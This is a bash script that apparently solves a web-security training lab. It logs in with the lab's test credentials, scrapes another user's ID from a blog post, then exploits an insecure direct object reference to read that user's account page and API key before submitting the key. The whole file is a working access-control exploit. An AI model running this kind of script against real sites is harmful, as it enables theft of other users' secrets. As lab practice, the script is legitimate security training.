#!/bin/bash

login(){
    echo "(+) Loggin in as user Wiener..."

    login_page="${url}/login"

    credentials="username=wiener&password=peter"
    export cookie=$(curl -s -o /dev/null -c - "$login_page" -d "$credentials" | awk '/session/ {print $NF}')

    post_url="${url}/post?postId=2"
    wiener_id=$(curl -s "$post_url" | grep 'userId' | cut -d '=' -f 4 | cut -d "'" -f 1)
    wiener_account="${url}/my-account?id=${wiener_id}"

    reponse=$(curl -s -o /dev/null "$wiener_account" -w %{http_code} -b "session=${cookie}")
    if [[ "$reponse" -eq 200 ]]; then
        echo "(+) Successfully logged in as user Wiener."
    else
        echo "(-) Could not log in"
        echo "(-) Exiting..."
        exit 1
    fi
}

get_carlos_id() {

    echo "(+) Getting Carlos's ID..."
    post_url="${url}/post?postId=3"
    carlos_id=$(curl -s "$post_url" | grep 'userId' | cut -d '=' -f 4 | cut -d "'" -f 1)
    echo "(+) Found Carlos Id: ${carlos_id}" 

    echo "(+) Getting Carlos's API key..."
    carlos_account="${url}/my-account?id=${carlos_id}"
    export key=$(curl -s "$carlos_account" -b "session="${cookie}"" | grep 'API' | cut -d ':' -f 2 | cut -d '<' -f 1 | xargs) #| awk -F '</?div>' '/Your API Key is:/ {print $2}' | awk '{print $NF}')
    echo "(+) Found the API Key: ${key}"

}

submit_key() {

    echo "(+) Submitting the key..."
    response=$(curl -s -o /dev/null -w "%{http_code}" -d "answer=${key}" "${url}/submitSolution" -b "session=${cookie}")
    if [[ "${response}" -eq 200 ]]; then
        echo "(+) Successfully completed the Lab!"
    else
        echo "(+) Something went wrong!"
        echo "(+) Exiting..."
        exit 1
    fi
}


main() {

    if [ $# -ne 1 ]; then
        echo "(+) Usage: $0 website"
        echo "(+) Example: $0 www.example.com"
        exit 1
    fi

    echo "(+) Starting the script..."
    url=$1
    login "$url"
    get_carlos_id "$url"
    submit_key "$url"

}

main "$@"